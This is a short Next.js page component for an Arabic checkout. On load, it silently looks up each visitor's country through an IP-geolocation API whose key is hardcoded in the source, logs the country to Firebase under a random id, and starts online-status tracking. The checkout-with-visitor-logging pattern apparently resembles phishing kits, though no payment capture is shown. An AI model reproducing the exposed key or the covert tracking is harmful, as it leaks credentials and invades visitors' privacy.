"use client"

import Component from "@/components/arabic-checkout"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"
import { useEffect } from "react"

function randstr(prefix: string) {
  return Math.random()
    .toString(36)
    .replace("0.", prefix || "")
}

const _id = randstr("infop-")

export default function Page() {
  useEffect(() => {
    getLocation().then(() => {})
  }, [])

  async function getLocation() {
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()

      addData({
        id: _id,
        country: country,
      })

      localStorage.setItem("country", country)
      setupOnlineStatus(_id)
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }

  return <Component />
}
